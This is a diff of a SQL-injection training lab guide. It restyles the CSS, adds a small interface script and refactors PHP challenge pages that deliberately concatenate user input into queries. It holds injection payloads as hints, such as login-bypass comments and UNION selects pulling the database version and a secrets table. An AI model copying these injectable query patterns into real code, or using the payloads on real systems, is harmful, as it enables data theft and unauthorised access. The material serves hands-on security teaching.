@@ -99,7 +99,7 @@ UNION
 SELECT username, password FROM users;
 
 -- Comments
---  : Single-line comment (MySQL, PostgreSQL, MSSQL)
+--  : Single-line comment (MySQL requires whitespace after `--`; use `-- -` for reliability)
 #   : Single-line comment (MySQL only)
 /* */ : Multi-line comment (all)
 ```
@@ -210,7 +210,7 @@ This is harder to detect because the initial input doesn't cause an error.
 | URL parameters | `http://site.com/page.php?id=1` |
 | Form fields | Login, search, contact forms |
 | HTTP headers | User-Agent, Cookie, Referer |
-| JSON/API data | `{"username": "admin' --"}` |
+| JSON/API data | `{"username": "admin' -- -"}` |
 | File upload metadata | Filenames, EXIF data |
 
 **Testing with simple payloads:**
@@ -502,6 +502,7 @@ Create a folder called `sqli_lab` in your web root (`/opt/lampp/htdocs/sqli_lab/
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>SQLi Lab — Home</title>
     <link rel="stylesheet" href="style.css">
+    <script src="script.js" defer></script>
 </head>
 <body>
     <div class="container">
@@ -561,269 +562,548 @@ Create a folder called `sqli_lab` in your web root (`/opt/lampp/htdocs/sqli_lab/
 #### File 2: `style.css` — Styling
 
 ```css
+@import url('https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;700&display=swap');
+
+:root {
+    --bg-sky: #f2f8ff;
+    --bg-sun: #fff6db;
+    --bg-mint: #dff8f0;
+    --card: #ffffff;
+    --card-soft: #f8fbff;
+    --ink-strong: #12324a;
+    --ink-mid: #2a5269;
+    --ink-soft: #5a7a8f;
+    --accent-hot: #ef5f3c;
+    --accent-warm: #ff8f3f;
+    --accent-cool: #189ab4;
+    --success: #117a52;
+    --danger: #b33434;
+    --warning: #b86b00;
+    --radius-lg: 20px;
+    --radius-md: 14px;
+    --radius-sm: 10px;
+    --shadow-main: 0 22px 55px rgba(19, 40, 61, 0.16);
+    --shadow-soft: 0 10px 28px rgba(19, 40, 61, 0.1);
+}
+
 * {
     margin: 0;
     padding: 0;
     box-sizing: border-box;
 }
 
+html,
 body {
-    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-    line-height: 1.6;
-    color: #333;
-    background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
-    min-height: 100vh;
-    padding: 20px;
+    min-height: 100%;
+}
+
+body {
+    font-family: 'IBM Plex Mono', 'SFMono-Regular', Menlo, Consolas, 'Liberation Mono', monospace;
+    line-height: 1.62;
+    color: var(--ink-strong);
+    background:
+        radial-gradient(circle at 10% 20%, rgba(255, 167, 105, 0.25), transparent 42%),
+        radial-gradient(circle at 88% 12%, rgba(24, 154, 180, 0.2), transparent 42%),
+        linear-gradient(140deg, var(--bg-sky) 0%, var(--bg-sun) 52%, var(--bg-mint) 100%);
+    padding: clamp(14px, 2.6vw, 28px);
+    overflow-x: hidden;
+    position: relative;
+}
+
+body::before,
+body::after {
+    content: '';
+    position: fixed;
+    width: 280px;
+    height: 280px;
+    border-radius: 50%;
+    pointer-events: none;
+    filter: blur(2px);
+    z-index: 0;
+    animation: drift 14s ease-in-out infinite;
+}
+
+body::before {
+    background: radial-gradient(circle, rgba(239, 95, 60, 0.2) 0%, rgba(239, 95, 60, 0.05) 60%, transparent 100%);
+    top: -90px;
+    right: -80px;
+}
+
+body::after {
+    background: radial-gradient(circle, rgba(24, 154, 180, 0.2) 0%, rgba(24, 154, 180, 0.04) 60%, transparent 100%);
+    bottom: -120px;
+    left: -60px;
+    animation-delay: -5s;
 }
 
 .container {
-    max-width: 1000px;
+    max-width: 1080px;
     margin: 0 auto;
-    background: #fff;
-    border-radius: 10px;
-    box-shadow: 0 0 30px rgba(0, 0, 0, 0.3);
+    background: rgba(255, 255, 255, 0.94);
+    border: 1px solid rgba(255, 255, 255, 0.75);
+    border-radius: var(--radius-lg);
+    box-shadow: var(--shadow-main);
+    backdrop-filter: blur(4px);
     overflow: hidden;
+    position: relative;
+    z-index: 2;
 }
 
 header {
-    background: linear-gradient(90deg, #e94560, #0f3460);
-    color: #fff;
-    padding: 30px;
+    background: linear-gradient(122deg, #153f61 0%, #1d6d84 52%, #ef5f3c 100%);
+    color: #f4fbff;
+    padding: clamp(26px, 4vw, 44px) clamp(20px, 3vw, 42px);
     text-align: center;
+    position: relative;
+    overflow: hidden;
+    isolation: isolate;
+}
+
+header::after {
+    content: '';
+    position: absolute;
+    inset: 0;
+    background-image: linear-gradient(120deg, rgba(255, 255, 255, 0.17) 0%, transparent 45%, rgba(255, 255, 255, 0.12) 100%);
+    mix-blend-mode: overlay;
+    z-index: -1;
 }
 
 header h1 {
-    font-size: 2.2em;
-    margin-bottom: 5px;
+    font-size: clamp(1.8rem, 3.6vw, 3rem);
+    line-height: 1.1;
+    letter-spacing: 0.01em;
+    text-wrap: balance;
 }
 
 header p {
-    font-size: 0.9em;
-    opacity: 0.8;
+    font-size: clamp(0.95rem, 1.5vw, 1.07rem);
+    opacity: 0.92;
+    margin-top: 8px;
 }
 
 nav {
-    background: #16213e;
+    background: linear-gradient(90deg, #133751 0%, #1f5d7e 100%);
     display: flex;
     justify-content: center;
     flex-wrap: wrap;
-    padding: 10px;
+    gap: 8px;
+    padding: 12px;
+    border-bottom: 1px solid rgba(255, 255, 255, 0.2);
 }
 
 nav a {
-    color: #fff;
+    color: #eaf7ff;
     text-decoration: none;
-    padding: 10px 20px;
-    margin: 0 5px;
-    border-radius: 5px;
-    transition: background 0.3s;
+    padding: 10px 16px;
+    border-radius: 999px;
+    border: 1px solid transparent;
+    font-weight: 600;
+    font-size: 0.95rem;
+    transition: transform 0.25s ease, background-color 0.25s ease, border-color 0.25s ease;
 }
 
-nav a:hover {
-    background: #e94560;
+nav a:hover,
+nav a.active {
+    background: rgba(255, 255, 255, 0.16);
+    border-color: rgba(255, 255, 255, 0.34);
+    transform: translateY(-1px);
 }
 
 main {
-    padding: 30px;
+    padding: clamp(18px, 3vw, 34px);
 }
 
 section {
-    margin-bottom: 30px;
+    margin-bottom: 28px;
 }
 
 section h2 {
-    color: #0f3460;
-    margin-bottom: 15px;
-    padding-bottom: 10px;
-    border-bottom: 3px solid #e94560;
+    color: #0f4666;
+    margin-bottom: 16px;
+    font-size: clamp(1.28rem, 2.2vw, 1.8rem);
+    display: inline-flex;
+    align-items: center;
+    gap: 10px;
+}
+
+section h2::after {
+    content: '';
+    display: inline-block;
+    height: 3px;
+    width: 54px;
+    border-radius: 999px;
+    background: linear-gradient(90deg, var(--accent-hot), var(--accent-cool));
+}
+
+.welcome {
+    background: linear-gradient(135deg, rgba(255, 255, 255, 0.95) 0%, rgba(242, 250, 255, 0.95) 100%);
+    border: 1px solid #d8ebfb;
+    border-radius: var(--radius-md);
+    box-shadow: var(--shadow-soft);
+    padding: clamp(16px, 2.4vw, 24px);
 }
 
 .welcome p {
-    margin-bottom: 10px;
-    font-size: 1.05em;
+    margin-bottom: 8px;
+    color: var(--ink-mid);
 }
 
 .welcome strong {
-    color: #e94560;
+    color: var(--accent-hot);
 }
 
 .challenge-card {
-    background: #f8f9fa;
-    border: 1px solid #dee2e6;
-    border-radius: 8px;
-    padding: 20px;
-    margin-bottom: 15px;
-    transition: transform 0.2s, box-shadow 0.2s;
+    background: linear-gradient(150deg, #ffffff 0%, #f2f9ff 100%);
+    border: 1px solid #dcecf8;
+    border-radius: var(--radius-md);
+    padding: clamp(16px, 2.2vw, 24px);
+    margin-bottom: 14px;
+    box-shadow: var(--shadow-soft);
+    transition: transform 0.28s ease, box-shadow 0.28s ease, border-color 0.28s ease;
+    transform-style: preserve-3d;
+    will-change: transform;
 }
 
 .challenge-card:hover {
-    transform: translateY(-2px);
-    box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+    box-shadow: 0 16px 34px rgba(15, 70, 102, 0.15);
+    border-color: #b2daf3;
 }
 
 .challenge-card h3 {
-    color: #0f3460;
+    color: #0d3f5e;
     margin-bottom: 8px;
+    font-size: clamp(1.06rem, 1.8vw, 1.28rem);
 }
 
 .challenge-card p {
-    margin-bottom: 12px;
-    color: #555;
+    margin-bottom: 14px;
+    color: var(--ink-mid);
 }
 
 .btn {
-    display: inline-block;
-    background: #e94560;
+    display: inline-flex;
+    align-items: center;
+    justify-content: center;
+    gap: 8px;
+    background: linear-gradient(90deg, var(--accent-hot), var(--accent-warm));
     color: #fff;
-    padding: 10px 20px;
+    padding: 11px 18px;
     text-decoration: none;
-    border-radius: 5px;
+    border-radius: 999px;
     border: none;
     cursor: pointer;
-    font-size: 0.95em;
-    transition: background 0.3s;
+    font-size: 0.95rem;
+    font-weight: 700;
+    letter-spacing: 0.01em;
+    box-shadow: 0 8px 18px rgba(239, 95, 60, 0.3);
+    transition: transform 0.2s ease, filter 0.2s ease;
 }
 
 .btn:hover {
-    background: #c73e54;
+    transform: translateY(-1px);
+    filter: brightness(1.05);
 }
 
-.btn-secondary {
-    background: #0f3460;
-}
-
-.btn-secondary:hover {
-    background: #1a4a7a;
+.btn:active {
+    transform: translateY(0);
 }
 
 .form-group {
-    margin-bottom: 15px;
+    margin-bottom: 14px;
+}
+
+form {
+    background: var(--card-soft);
+    border: 1px solid #d9eaf6;
+    border-radius: var(--radius-md);
+    padding: clamp(14px, 2vw, 20px);
+    box-shadow: var(--shadow-soft);
 }
 
 label {
     display: block;
-    margin-bottom: 5px;
-    font-weight: bold;
-    color: #333;
+    margin-bottom: 6px;
+    font-weight: 700;
+    color: #19435e;
+    font-size: 0.95rem;
 }
 
-input[type="text"],
-input[type="password"],
-input[type="number"],
+input[type='text'],
+input[type='password'],
+input[type='number'],
 select {
     width: 100%;
-    padding: 10px 12px;
-    border: 2px solid #dee2e6;
-    border-radius: 5px;
-    font-size: 1em;
-    transition: border-color 0.3s;
+    padding: 11px 12px;
+    border: 1.8px solid #cfe2f0;
+    border-radius: var(--radius-sm);
+    font-size: 0.98rem;
+    color: #12324a;
+    background: #fff;
+    transition: border-color 0.22s ease, box-shadow 0.22s ease;
 }
 
-input[type="text"]:focus,
-input[type="password"]:focus,
-input[type="number"]:focus {
+input[type='text']:focus,
+input[type='password']:focus,
+input[type='number']:focus,
+select:focus {
     outline: none;
-    border-color: #0f3460;
+    border-color: var(--accent-cool);
+    box-shadow: 0 0 0 4px rgba(24, 154, 180, 0.17);
+}
+
+.info-box,
+.result-box,
+.error-box,
+.success-box,
+.hint-box {
+    border-radius: var(--radius-md);
+    padding: clamp(12px, 1.8vw, 16px);
+    margin-top: 14px;
+    border: 1px solid transparent;
+    box-shadow: 0 6px 18px rgba(18, 50, 74, 0.06);
+}
+
+.info-box {
+    background: linear-gradient(160deg, #f0faff 0%, #ebf7ff 100%);
+    border-color: #c8e5f8;
+}
+
+.info-box h4 {
+    color: #0d4c73;
+    margin-bottom: 8px;
 }
 
 .result-box {
-    background: #f0f8ff;
-    border: 1px solid #b8d4f0;
-    border-radius: 5px;
-    padding: 15px;
-    margin-top: 15px;
+    background: linear-gradient(160deg, #f8fcff 0%, #f0f8ff 100%);
+    border-color: #d5e9f7;
     overflow-x: auto;
 }
 
 .result-box table {
     width: 100%;
     border-collapse: collapse;
-    margin: 10px 0;
+    margin-top: 10px;
+    min-width: 560px;
 }
 
 .result-box th {
-    background: #0f3460;
-    color: #fff;
+    background: #145075;
+    color: #f3fbff;
     padding: 10px;
     text-align: left;
+    font-size: 0.9rem;
 }
 
 .result-box td {
-    padding: 8px 10px;
-    border-bottom: 1px solid #dee2e6;
+    padding: 9px 10px;
+    border-bottom: 1px solid #deecf7;
+    color: #264e67;
 }
 
-.result-box tr:hover {
-    background: #e8f4fd;
+.result-box tbody tr:hover {
+    background: rgba(24, 154, 180, 0.08);
+}
+
+.query-wrap {
+    position: relative;
+    margin-top: 10px;
 }
 
 .query-box {
-    background: #1e1e1e;
-    color: #d4d4d4;
-    padding: 12px;
-    border-radius: 5px;
-    font-family: 'Courier New', monospace;
-    font-size: 0.9em;
+    background: linear-gradient(160deg, #0f2436 0%, #173349 100%);
+    color: #d6ecff;
+    padding: 12px 44px 12px 12px;
+    border-radius: var(--radius-sm);
+    font-family: 'IBM Plex Mono', 'SFMono-Regular', Menlo, Consolas, 'Liberation Mono', monospace;
+    font-size: 0.9rem;
     overflow-x: auto;
-    margin-top: 10px;
     white-space: pre-wrap;
-    word-break: break-all;
+    word-break: break-word;
+    border: 1px solid rgba(167, 213, 241, 0.2);
+}
+
+.copy-btn {
+    position: absolute;
+    top: 8px;
+    right: 8px;
+    border: 1px solid rgba(192, 228, 255, 0.4);
+    background: rgba(255, 255, 255, 0.08);
+    color: #d2ebff;
+    border-radius: 999px;
+    padding: 4px 10px;
+    font-size: 0.75rem;
+    font-weight: 700;
+    cursor: pointer;
+    transition: background-color 0.22s ease;
+}
+
+.copy-btn:hover {
+    background: rgba(255, 255, 255, 0.18);
 }
 
 .error-box {
-    background: #fff0f0;
-    border: 1px solid #ffcccc;
-    color: #cc0000;
-    padding: 12px;
-    border-radius: 5px;
-    margin-top: 10px;
+    background: #fff2f1;
+    border-color: #f3c5c2;
+    color: var(--danger);
 }
 
 .success-box {
-    background: #f0fff0;
-    border: 1px solid #ccffcc;
-    color: #006600;
-    padding: 12px;
-    border-radius: 5px;
-    margin-top: 10px;
+    background: #eefbf5;
+    border-color: #bee9d3;
+    color: var(--success);
 }
 
 .hint-box {
-    background: #fffbe6;
-    border: 1px solid #ffe58f;
-    padding: 12px;
-    border-radius: 5px;
-    margin-top: 10px;
-    font-size: 0.9em;
+    background: #fff7e8;
+    border-color: #f8dfb0;
+    color: #654300;
 }
 
 .hint-box strong {
-    color: #d48806;
+    color: var(--warning);
 }
 
-.info-box {
-    background: #e6f7ff;
-    border: 1px solid #91d5ff;
-    padding: 15px;
-    border-radius: 5px;
-    margin: 15px 0;
-}
-
-.info-box h4 {
-    color: #003a8c;
-    margin-bottom: 8px;
+code {
+    font-family: 'IBM Plex Mono', 'SFMono-Regular', Menlo, Consolas, 'Liberation Mono', monospace;
+    background: rgba(16, 55, 78, 0.08);
+    color: #0f3f5c;
+    padding: 2px 6px;
+    border-radius: 6px;
 }
 
 footer {
-    background: #16213e;
-    color: #fff;
+    background: linear-gradient(90deg, #133751 0%, #1a5f80 100%);
+    color: #e5f6ff;
     text-align: center;
     padding: 15px;
-    font-size: 0.85em;
+    font-size: 0.86rem;
+    letter-spacing: 0.01em;
+}
+
+.reveal {
+    opacity: 0;
+    transform: translateY(14px);
+    animation: revealUp 0.6s ease forwards;
+    animation-delay: var(--reveal-delay, 0ms);
+}
+
+@keyframes revealUp {
+    to {
+        opacity: 1;
+        transform: translateY(0);
+    }
+}
+
+@keyframes drift {
+    0%,
+    100% {
+        transform: translateY(0) translateX(0);
+    }
+    50% {
+        transform: translateY(-14px) translateX(8px);
+    }
+}
+
+@media (max-width: 760px) {
+    nav {
+        justify-content: flex-start;
+        padding: 10px;
+    }
+
+    nav a {
+        font-size: 0.88rem;
+        padding: 8px 12px;
+    }
+
+    .result-box table {
+        min-width: 460px;
+    }
+}
+
+@media (prefers-reduced-motion: reduce) {
+    * {
+        animation: none !important;
+        transition: none !important;
+    }
 }
 ```
 
-#### File 3: `login.php` — Login Bypass Challenge
+#### File 3: `script.js` — Interactivity
+
+```javascript
+document.addEventListener('DOMContentLoaded', () => {
+    const current = window.location.pathname.split('/').pop() || 'index.html';
+
+    document.querySelectorAll('nav a').forEach((link) => {
+        const href = link.getAttribute('href') || '';
+        if (href === current || (current === '' && href === 'index.html')) {
+            link.classList.add('active');
+        }
+    });
+
+    const revealTargets = [
+        ...new Set([
+            ...document.querySelectorAll('header, nav, main > *, .challenge-card, .result-box, .info-box, .hint-box, form')
+        ])
+    ];
+
+    revealTargets.forEach((el, index) => {
+        el.classList.add('reveal');
+        el.style.setProperty('--reveal-delay', `${Math.min(index * 70, 700)}ms`);
+    });
+
+    document.querySelectorAll('.challenge-card, .info-box, .result-box').forEach((card) => {
+        card.addEventListener('mousemove', (event) => {
+            const rect = card.getBoundingClientRect();
+            const x = event.clientX - rect.left;
+            const y = event.clientY - rect.top;
+            const rotateX = ((y / rect.height) - 0.5) * -5;
+            const rotateY = ((x / rect.width) - 0.5) * 5;
+            card.style.transform = `perspective(800px) rotateX(${rotateX.toFixed(2)}deg) rotateY(${rotateY.toFixed(2)}deg)`;
+        });
+
+        card.addEventListener('mouseleave', () => {
+            card.style.transform = 'perspective(800px) rotateX(0deg) rotateY(0deg)';
+        });
+    });
+
+    document.querySelectorAll('.query-box').forEach((box) => {
+        const wrapper = document.createElement('div');
+        wrapper.className = 'query-wrap';
+        box.parentNode.insertBefore(wrapper, box);
+        wrapper.appendChild(box);
+
+        const btn = document.createElement('button');
+        btn.type = 'button';
+        btn.className = 'copy-btn';
+        btn.textContent = 'Copy';
+
+        btn.addEventListener('click', async () => {
+            const text = box.innerText.trim();
+            if (!text) {
+                return;
+            }
+
+            try {
+                await navigator.clipboard.writeText(text);
+                btn.textContent = 'Copied';
+                setTimeout(() => {
+                    btn.textContent = 'Copy';
+                }, 1200);
+            } catch (_err) {
+                btn.textContent = 'Denied';
+                setTimeout(() => {
+                    btn.textContent = 'Copy';
+                }, 1200);
+            }
+        });
+
+        wrapper.appendChild(btn);
+    });
+});
+```
+
+#### File 4: `login.php` — Login Bypass Challenge
 
 ```php
 <?php
@@ -832,49 +1112,40 @@ $user = 'root';
 $pass = '';
 $db = 'sqli_lab';
 
-$conn = new mysqli($host, $user, $pass, $db);
-
-if ($conn->connect_error) {
-    die("Connection failed: " . $conn->connect_error);
+$conn = null;
+$db_error = null;
+try {
+    $conn = new mysqli($host, $user, $pass, $db);
+    $conn->set_charset('utf8mb4');
+} catch (mysqli_sql_exception $e) {
+    $db_error = $e->getMessage();
 }
 
 $result = null;
 $error = null;
 $query = null;
+$user_data = null;
 
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-    $username = $_POST['username'];
-    $password = $_POST['password'];
+    $username = $_POST['username'] ?? '';
+    $password = $_POST['password'] ?? '';
 
     // VULNERABLE QUERY — Intentionally vulnerable for learning
     $query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
 
-    $result = $conn->query($query);
-
-    if ($result && $result->num_rows > 0) {
-        $user = $result->fetch_assoc();
-        // No further output — login success is shown differently
+    if ($conn) {
+        try {
+            $result = $conn->query($query);
+        } catch (mysqli_sql_exception $e) {
+            $error = $e->getMessage();
+            $result = null;
+        }
+    } else {
+        $error = $db_error ?: 'Database connection failed.';
     }
-}
-
-// No, trust the process
-$show_result = false;
-if ($result && $result->num_rows > 0) {
-    $user_data = $result->fetch_assoc();
-    $show_result = true;
-}
-// Actually let's use the already fetched data
-$result = null;
-if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-    $username = $_POST['username'];
-    $password = $_POST['password'];
-
-    $query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
-
-    $result = $conn->query($query);
 
     if ($result && $result->num_rows > 0) {
-        // Success — will show below
+        $user_data = $result->fetch_assoc();
     }
 }
 ?>
@@ -882,8 +1153,10 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 <html lang="en">
 <head>
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Login Bypass Challenge</title>
     <link rel="stylesheet" href="style.css">
+    <script src="script.js" defer></script>
 </head>
 <body>
     <div class="container">
@@ -926,20 +1199,31 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                 </div>
             <?php endif; ?>
 
+            <?php if ($error): ?>
+                <div class="error-box">
+                    <strong>Database error:</strong> <?php echo htmlspecialchars($error); ?>
+                </div>
+            <?php endif; ?>
+
+            <?php if ($db_error && $_SERVER['REQUEST_METHOD'] !== 'POST'): ?>
+                <div class="error-box">
+                    <strong>Database connection error:</strong> <?php echo htmlspecialchars($db_error); ?>
+                </div>
+            <?php endif; ?>
+
             <?php
             if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-                if ($result && $result->num_rows > 0) {
-                    $user = $result->fetch_assoc();
+                if ($user_data) {
                     echo '<div class="success-box">';
                     echo '<h3>Login Successful!</h3>';
-                    echo '<p>Welcome, <strong>' . htmlspecialchars($user['username']) . '</strong></p>';
-                    echo '<p>Your role: <strong>' . htmlspecialchars($user['role']) . '</strong></p>';
-                    echo '<p>Your email: ' . htmlspecialchars($user['email']) . '</p>';
-                    if ($user['role'] === 'admin') {
+                    echo '<p>Welcome, <strong>' . htmlspecialchars($user_data['username']) . '</strong></p>';
+                    echo '<p>Your role: <strong>' . htmlspecialchars($user_data['role']) . '</strong></p>';
+                    echo '<p>Your email: ' . htmlspecialchars($user_data['email']) . '</p>';
+                    if ($user_data['role'] === 'admin') {
                         echo '<h4>Flag: CTF{Login_Bypass_Successful}</h4>';
                     }
                     echo '</div>';
-                } else {
+                } elseif (!$error) {
                     echo '<div class="error-box">';
                     echo '<strong>Login failed:</strong> Invalid username or password.';
                     echo '</div>';
@@ -949,7 +1233,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 
             <div class="hint-box">
                 <strong>Hint:</strong> Think about how you can make the WHERE clause always true.
-                What if you could comment out the rest of the query?
+                What if you could comment out the rest of the query with <code>-- -</code>?
             </div>
         </main>
 
@@ -961,7 +1245,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 </html>
 ```
 
-#### File 4: `search.php` — UNION-Based SQLi Challenge
+#### File 5: `search.php` — UNION-Based SQLi Challenge
 
 ```php
 <?php
@@ -970,10 +1254,13 @@ $user = 'root';
 $pass = '';
 $db = 'sqli_lab';
 
-$conn = new mysqli($host, $user, $pass, $db);
-
-if ($conn->connect_error) {
-    die("Connection failed: " . $conn->connect_error);
+$conn = null;
+$db_error = null;
+try {
+    $conn = new mysqli($host, $user, $pass, $db);
+    $conn->set_charset('utf8mb4');
+} catch (mysqli_sql_exception $e) {
+    $db_error = $e->getMessage();
 }
 
 $results = [];
@@ -986,14 +1273,17 @@ if (isset($_GET['search'])) {
     // VULNERABLE QUERY
     $query = "SELECT id, name, description, price FROM products WHERE name LIKE '%$search%' OR description LIKE '%$search%'";
 
-    $result = $conn->query($query);
-
-    if ($result) {
-        while ($row = $result->fetch_assoc()) {
-            $results[] = $row;
+    if ($conn) {
+        try {
+            $result = $conn->query($query);
+            while ($row = $result->fetch_assoc()) {
+                $results[] = $row;
+            }
+        } catch (mysqli_sql_exception $e) {
+            $error = $e->getMessage();
         }
     } else {
-        $error = $conn->error;
+        $error = $db_error ?: 'Database connection failed.';
     }
 }
 ?>
@@ -1001,8 +1291,10 @@ if (isset($_GET['search'])) {
 <html lang="en">
 <head>
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Search Injection Challenge</title>
     <link rel="stylesheet" href="style.css">
+    <script src="script.js" defer></script>
 </head>
 <body>
     <div class="container">
@@ -1047,6 +1339,12 @@ if (isset($_GET['search'])) {
                 </div>
             <?php endif; ?>
 
+            <?php if ($db_error && !isset($_GET['search'])): ?>
+                <div class="error-box">
+                    <strong>Database connection error:</strong> <?php echo htmlspecialchars($db_error); ?>
+                </div>
+            <?php endif; ?>
+
             <?php if (!empty($results)): ?>
                 <div class="result-box">
                     <h3>Search Results (<?php echo count($results); ?> found)</h3>
@@ -1078,7 +1376,7 @@ if (isset($_GET['search'])) {
             <?php endif; ?>
 
             <div class="hint-box">
-                <strong>Hint:</strong> Try using <code>' UNION SELECT 1,2,3,4 -- </code> to find the column count.
+                <strong>Hint:</strong> Try using <code>' UNION SELECT 1,2,3,4 -- -</code> to find the column count.
                 Then replace 1,2,3,4 with data from the users table.
             </div>
         </main>
@@ -1091,7 +1389,7 @@ if (isset($_GET['search'])) {
 </html>
 ```
 
-#### File 5: `product.php` — Error-Based SQLi Challenge
+#### File 6: `product.php` — Integer-Based UNION SQLi Challenge
 
 ```php
 <?php
@@ -1100,13 +1398,16 @@ $user = 'root';
 $pass = '';
 $db = 'sqli_lab';
 
-$conn = new mysqli($host, $user, $pass, $db);
-
-if ($conn->connect_error) {
-    die("Connection failed: " . $conn->connect_error);
+$conn = null;
+$db_error = null;
+try {
+    $conn = new mysqli($host, $user, $pass, $db);
+    $conn->set_charset('utf8mb4');
+} catch (mysqli_sql_exception $e) {
+    $db_error = $e->getMessage();
 }
 
-$product = null;
+$rows = [];
 $error = null;
 $query = null;
 
@@ -1116,12 +1417,20 @@ if (isset($_GET['id'])) {
     // VULNERABLE QUERY
     $query = "SELECT id, name, description, price FROM products WHERE id = $id";
 
-    $result = $conn->query($query);
-
-    if ($result && $result->num_rows > 0) {
-        $product = $result->fetch_assoc();
+    if ($conn) {
+        try {
+            $result = $conn->query($query);
+            while ($row = $result->fetch_assoc()) {
+                $rows[] = $row;
+            }
+            if (empty($rows)) {
+                $error = 'Product not found.';
+            }
+        } catch (mysqli_sql_exception $e) {
+            $error = $e->getMessage();
+        }
     } else {
-        $error = $conn->error ?: 'Product not found.';
+        $error = $db_error ?: 'Database connection failed.';
     }
 }
 ?>
@@ -1129,14 +1438,16 @@ if (isset($_GET['id'])) {
 <html lang="en">
 <head>
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Product Enumeration Challenge</title>
     <link rel="stylesheet" href="style.css">
+    <script src="script.js" defer></script>
 </head>
 <body>
     <div class="container">
         <header>
             <h1>Challenge 3: Product Enumeration</h1>
-            <p>Exploit the product ID parameter</p>
+            <p>Exploit the product ID parameter with integer-based SQL injection</p>
         </header>
 
         <nav>
@@ -1150,7 +1461,7 @@ if (isset($_GET['id'])) {
         <main>
             <div class="info-box">
                 <h4>Objective</h4>
-                <p>The product ID is injected directly without quotes. Use this to extract the database version, current user, and data from the <strong>secrets</strong> table.</p>
+                <p>The product ID is injected directly without quotes. Use this to extract the database version, current user, table names, and data from the <strong>secrets</strong> table.</p>
                 <div class="query-box">SELECT id, name, description, price FROM products WHERE id = $id</div>
             </div>
 
@@ -1169,14 +1480,28 @@ if (isset($_GET['id'])) {
                 </div>
             <?php endif; ?>
 
-            <?php if ($product): ?>
+            <?php if (!empty($rows)): ?>
                 <div class="result-box">
-                    <h3>Product Details</h3>
+                    <h3>Results (<?php echo count($rows); ?> row<?php echo count($rows) === 1 ? '' : 's'; ?>)</h3>
                     <table>
-                        <tr><th>ID</th><td><?php echo htmlspecialchars($product['id']); ?></td></tr>
-                        <tr><th>Name</th><td><?php echo htmlspecialchars($product['name']); ?></td></tr>
-                        <tr><th>Description</th><td><?php echo htmlspecialchars($product['description']); ?></td></tr>
-                        <tr><th>Price</th><td>$<?php echo htmlspecialchars($product['price']); ?></td></tr>
+                        <thead>
+                            <tr>
+                                <th>ID</th>
+                                <th>Name</th>
+                                <th>Description</th>
+                                <th>Price</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <?php foreach ($rows as $row): ?>
+                            <tr>
+                                <td><?php echo htmlspecialchars($row['id'] ?? 'N/A'); ?></td>
+                                <td><?php echo htmlspecialchars($row['name'] ?? 'N/A'); ?></td>
+                                <td><?php echo htmlspecialchars($row['description'] ?? 'N/A'); ?></td>
+                                <td><?php echo htmlspecialchars($row['price'] ?? 'N/A'); ?></td>
+                            </tr>
+                            <?php endforeach; ?>
+                        </tbody>
                     </table>
                 </div>
             <?php endif; ?>
@@ -1187,9 +1512,15 @@ if (isset($_GET['id'])) {
                 </div>
             <?php endif; ?>
 
+            <?php if ($db_error && !isset($_GET['id'])): ?>
+                <div class="error-box">
+                    <strong>Database connection error:</strong> <?php echo htmlspecialchars($db_error); ?>
+                </div>
+            <?php endif; ?>
+
             <div class="hint-box">
                 <strong>Hint:</strong> Try <code>1 UNION SELECT 1, @@version, user(), 4</code> to get the database version and current user.
-                Then try <code>1 UNION SELECT 1, secret_key, secret_value, 4 FROM secrets</code>
+                Then try <code>1 UNION SELECT 1, secret_key, secret_value, 4 FROM secrets</code>.
             </div>
         </main>
 
@@ -1201,7 +1532,7 @@ if (isset($_GET['id'])) {
 </html>
 ```
 
-#### File 6: `user.php` — Blind SQLi Challenge
+#### File 7: `user.php` — Blind SQLi Challenge
 
 ```php
 <?php
@@ -1210,16 +1541,19 @@ $user = 'root';
 $pass = '';
 $db = 'sqli_lab';
 
-$conn = new mysqli($host, $user, $pass, $db);
-
-if ($conn->connect_error) {
-    die("Connection failed: " . $conn->connect_error);
+$conn = null;
+$db_error = null;
+try {
+    $conn = new mysqli($host, $user, $pass, $db);
+    $conn->set_charset('utf8mb4');
+} catch (mysqli_sql_exception $e) {
+    $db_error = $e->getMessage();
 }
 
 $user_found = false;
-$error = null;
+$query_error = null;
 $query = null;
-$message = '';
+$execution_time = null;
 
 if (isset($_GET['username'])) {
     $username = $_GET['username'];
@@ -1227,38 +1561,37 @@ if (isset($_GET['username'])) {
     // VULNERABLE QUERY — but only returns YES/NO
     $query = "SELECT * FROM users WHERE username = '$username'";
 
-    $result = $conn->query($query);
-
-    if ($result && $result->num_rows > 0) {
-        $user_found = true;
-        $user_data = $result->fetch_assoc();
-        $message = "User '" . htmlspecialchars($user_data['username']) . "' found! Role: " . htmlspecialchars($user_data['role']);
-    } else {
-        // No error output — the user just doesn't exist (or injection failed)
-        // Actually let's not show errors for blind
-        if ($conn->error) {
-            // Still no error display for blind practice
+    if ($conn) {
+        $start_time = microtime(true);
+        try {
+            $result = $conn->query($query);
+            $user_found = $result && $result->num_rows > 0;
+        } catch (mysqli_sql_exception $e) {
+            $query_error = 'Query failed. Check quote balancing and comment syntax.';
+            $user_found = false;
         }
+        $execution_time = (microtime(true) - $start_time) * 1000;
+    } else {
+        $query_error = $db_error ?: 'Database connection failed.';
+        $user_found = false;
+        $execution_time = 0;
     }
 }
-
-// Simple delay detection
-$start_time = microtime(true);
-// ... (the query already ran above)
-$execution_time = (microtime(true) - $start_time) * 1000;
 ?>
